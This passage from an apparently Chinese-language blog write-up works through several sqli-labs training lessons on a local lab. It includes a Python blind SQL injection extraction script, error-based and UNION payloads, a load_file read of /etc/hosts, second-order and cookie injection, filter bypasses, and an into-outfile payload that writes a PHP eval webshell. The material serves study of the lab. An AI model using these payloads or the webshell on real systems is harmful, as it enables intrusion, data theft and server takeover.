%d,1),%d,1)))--+"</span>%(column_name,database_name,table_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">            dump_length = y<span class="number">-1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'获取到此字段的长度为:%d'</span>%dump_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取该字段内容</span></span><br><span class="line">    dump_name=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, dump_length<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT %s FROM %s.%s limit %d,1),%d,1)) = %d)--+"</span> %(column_name,database_name,table_name, x, y, z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                t=chr(z)  </span><br><span class="line">                dump_name.append(t)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    this_dump_name = <span class="string">""</span>.join(dump_name)</span><br><span class="line">    <span class="keyword">print</span> this_dump_name</span><br></pre></td></tr></table></figure></p>
<p>这是我整个注入的过程，有不好的地方，代码还会再进行修改。</p>
<p>第六题和第五题一样，只要对payload稍作修改就好。</p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a><strong>0x04</strong></h2><p>报错注入：<br>知识点链接:<br>(<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036)[https://blog.csdn.net/zpy1998zpy/article/details/80631036]" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80631036)[https://blog.csdn.net/zpy1998zpy/article/details/80631036]</a><br>这里我们要学习一下<br>基于extractvalue()和updatexml()的报错注入<br>具体内容看上面的链接,反正都是从别人那儿搬来的知识点,我就不重复了.</p>
<p>extractvalue(): 对XML文档进行查询的函数<br>语法：extractvalue(目标xml文档，xml路径)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.user where id=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(‘anything’,concat(‘~’,(select database()))))</span><br></pre></td></tr></table></figure></p>
<p>updatexml():<br>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>关于updatexml()的知识点:<a href="http://www.cnblogs.com/AmoBlogs/p/8673748.html" target="_blank" rel="noopener">http://www.cnblogs.com/AmoBlogs/p/8673748.html</a><br>语法updatexml(目标xml文档，xml路径，更新的内容)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.user where id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(‘anything’,’/xx/xx’,’anything’))</span><br></pre></td></tr></table></figure></p>
<h1 id="sqli-lab-7"><a href="#sqli-lab-7" class="headerlink" title="sqli-lab 7"></a>sqli-lab 7</h1><p>知识点：mysql关于文件操作(文件的读/写)：</p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>通过load_file函数将文件内容爆出来，使用load_file函数的前提是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>当前权限对该文件可读</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>文件在该服务器上</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>路径完整</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>文件大小小于max_allowed_packet</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>当前数据库用户有FILE权限</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>secure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作</span><br></pre></td></tr></table></figure></p>
<p>例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(<span class="string">'D:\xampp\htdocs\www\wanju\htaccess.txt'</span>)</span><br><span class="line"></span><br><span class="line">select load_file(<span class="string">'/etc/hosts'</span>)</span><br></pre></td></tr></table></figure></p>
<p>所以我在这附近的一篇博客中写道关于Mysql注入loadfile常见路径，目的就是为了能够获取到服务器的一些相关信息。</p>
<h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><p>使用此语句，我们可以将select内容导入文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)目标目录要有可写权限</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)当前数据库用户要有FILE权限</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)目标文件不能已存在</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)secure_file_priv的值为空</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)路径完整</span><br></pre></td></tr></table></figure></p>
<p>这里一般可以想到常见的使用一句话木马来连接对方的服务器。</p>
<p>观察源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line">    <span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果我们注入正确将会返回，’You are in…. Use outfile……’，<br>payload中如果想要导入一句话木马的话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">')) UNION SELECT 1,2,'</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_post[<span class="string">"c"</span>])<span class="meta">?&gt;</span><span class="string">' into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\test.php"--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqli-lab-17"><a href="#sqli-lab-17" class="headerlink" title="sqli-lab 17"></a>sqli-lab 17</h1><p>这道题，首先看到修改密码，那么要想起mysql中修改数据的语句<br>基本语法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET password = <span class="string">'passwd'</span> WHERE user = <span class="string">'username'</span></span><br></pre></td></tr></table></figure></p>
<p>查看源码可知：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';   </span></span><br><span class="line">        $row1 = $row[<span class="string">'username'</span>];   </span><br><span class="line">        <span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">        $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">        mysql_query($update);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
<p>所以payload的构造中，我们要构造使得passwd闭合，然后username就随意吧。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;passwd=<span class="number">-1</span><span class="string">'and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;Submit=submit</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-20"><a href="#sqlilab-20" class="headerlink" title="sqlilab-20"></a>sqlilab-20</h1><p>我觉得这道题，实际上是一个cookie注入(个人这么认为)<br>一个cookie注入的实现有两点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件<span class="number">1</span>是：</span><br><span class="line"></span><br><span class="line">程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤</span><br><span class="line"></span><br><span class="line">条件<span class="number">2</span>是：在条件<span class="number">1</span>的基础上还需要程序对提交数据获取方式是直接request(<span class="string">"xxx"</span>)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了</span><br></pre></td></tr></table></figure></p>
<p>所以这里就要说到HTTP中cookie的工作过程了，当我们的浏览器带着认证信息，发出HTTP请求后，服务器将会对认证信息进行确认，然后，返回HTTP响应，并且在浏览器中种下cookie，浏览器下次发送HTTP请求时就会带上这个cookie,然后服务器再一次解析cookie,推送相应内容。</p>
<p>所以这次的sql注入点之所以在cookie,就是由于未对cookie进行过滤，所以使得注入有机可乘。</p>
<p>看关键源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">    </span><br><span class="line">        $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">        $result1 = mysql_query($sql);</span><br><span class="line">        $row1 = mysql_fetch_array($result1);</span><br><span class="line">        $cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">            <span class="keyword">if</span>($row1)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">                setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            $cookee = $_COOKIE[<span class="string">'uname'</span>];<span class="comment">//最关键的代码</span></span><br><span class="line">            $format = <span class="string">'D d M Y - H:i:s'</span>;</span><br><span class="line">            $timestamp = time() + <span class="number">3600</span>;    </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">            $sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;<span class="comment">//最关键的代码</span></span><br><span class="line">            $result=mysql_query($sql);</span><br><span class="line">            <span class="keyword">if</span> (!$result)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">                &#125;</span><br><span class="line">            $row = mysql_fetch_array($result);</span><br><span class="line">            <span class="keyword">if</span>($row)</span><br></pre></td></tr></table></figure></p>
<p>第一次成功登录后服务器将会在浏览器种下cookie<br><img src="/2019/01/28/巩固sql注入/17.png" alt=""></p>
<p>下一次刷新后，也就是再一次发起HTTP请求，此时将会带上cookie<br><img src="/2019/01/28/巩固sql注入/18.png" alt=""></p>
<p>那我们修改cookie,就能进行注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1<span class="string">'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span></span><br></pre></td></tr></table></figure></p>
<p>现在总算觉得对这道题有所理解，我之前都在干啥啊</p>
<h1 id="sqlilab-23"><a href="#sqlilab-23" class="headerlink" title="sqlilab-23"></a>sqlilab-23</h1><p>这道题中，观察源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure></p>
<p>可以见到在这道题中’#’和’–’已经被过滤掉了，而其中的sql语句又为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
<p>此处的payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">' union select 1,database(),'</span><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p>实际上这条语句为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=<span class="string">'-1'</span> union select <span class="number">1</span>,database(),<span class="string">'3'</span> limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>与之前的注释性闭合不同的是，这里我们构造新的闭合，在sql注入中有一点我觉得需要注意的就是sql语句的完整性。</p>
<p>同样可以使用报错注入,构造payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from  information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">'),0x7e)) or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-24"><a href="#sqlilab-24" class="headerlink" title="sqlilab-24"></a>sqlilab-24</h1><p>参考文章:<a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167089.html</a><br>参考文章:<a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp</a><br>这道题是关于二次注入,这道注入题，先来分析源码，建议把这道题的目录下的所有代码都看一遍，知道这道题是如何运作的<br>先是new_user.php,这段代码，可以看出，我们提交三个值分别为：username,password,re_password<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"username"</span> id=<span class="string">"username"</span> type=<span class="string">"text"</span> value=<span class="string">""</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;input name=<span class="string">"password"</span> id=<span class="string">"password"</span> type=<span class="string">"password"</span> value=<span class="string">""</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=<span class="string">"re_password"</span> id=<span class="string">"re_password"</span> type=<span class="string">"password"</span> value=<span class="string">""</span> /&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着是login_create.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//$username=  $_POST['username'] ;</span></span><br><span class="line">    $username=  mysql_escape_string($_POST[<span class="string">'username'</span>]) ;</span><br><span class="line">    $pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font size='3' color='#FFFF00'&gt;"</span>;</span><br><span class="line">    $sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">    $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br></pre></td></tr></table></figure></p>
<p>这段代码中有两个点，我觉得是需要注意的，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql_escape_string()函数</span><br><span class="line">(php&lt;<span class="number">5.4</span>)</span><br><span class="line">用于对sql中的特殊字符进行转义，特殊字符包括：</span><br><span class="line"></span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">\x1a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">本函数和 mysql_real_escape_string() 完全一样，</span></span><br><span class="line"><span class="string">除了 mysql_real_escape_string() 接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。</span></span><br></pre></td></tr></table></figure></p>
<p>用一个例子来进行说明<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $str = <span class="string">"SELECT * FROM users where id = 1' or '1'='1"</span>;</span><br><span class="line"> <span class="keyword">echo</span> mysql_escape_string($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>返回的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where id = <span class="number">1</span>\<span class="string">' or \'1\'=\'1</span></span><br></pre></td></tr></table></figure></p>
<p>另一个点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($pass==$re_pass)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                $sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">                mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br></pre></td></tr></table></figure></p>
<p>创建新的用户，然后这里有一个问题就是当我们输入问题用户为： admin’# 时，在数据库中查看发现并没有被转义啊，数据进入数据库后，将会被再次还原。<br><img src="/2019/01/28/巩固sql注入/19.png" alt=""></p>
<p>当我们创建新的用户后，登录后，修改密码，查看源码pass_change.php,<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure></p>
<p>当我们创建一个新用户 admin’# ,登录后，去修改其密码，那么sql语句就会为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET PASSWO=<span class="string">'cookie'</span> where username = <span class="string">'admin'</span><span class="comment">#' and password = 'test';</span></span><br></pre></td></tr></table></figure></p>
<p>二次注入由此完成</p>
<h1 id="sqlilab-25"><a href="#sqlilab-25" class="headerlink" title="sqlilab-25"></a>sqlilab-25</h1><p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);         <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里可见or还有and被过滤掉了。</p>
<p>所以在在这里我们使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|| 代替 <span class="keyword">or</span></span><br><span class="line">&amp;&amp; 代替 <span class="keyword">and</span></span><br></pre></td></tr></table></figure></p>
<p>所以这道题的payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="string">'|| extractvalue(1,concat(0x7e,(select database()))) || '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-25a"><a href="#sqlilab-25a" class="headerlink" title="sqlilab-25a"></a>sqlilab-25a</h1><p>此题观察源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
<p>没有报错项，且未有单引号掣肘。</p>
<p>所以同25题一样。<br>payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1%20UNION%20select%201,version(),3 || 1=1</span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-32"><a href="#sqlilab-32" class="headerlink" title="sqlilab-32"></a>sqlilab-32</h1><p>这里讲的是宽字节注入，先看看关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span 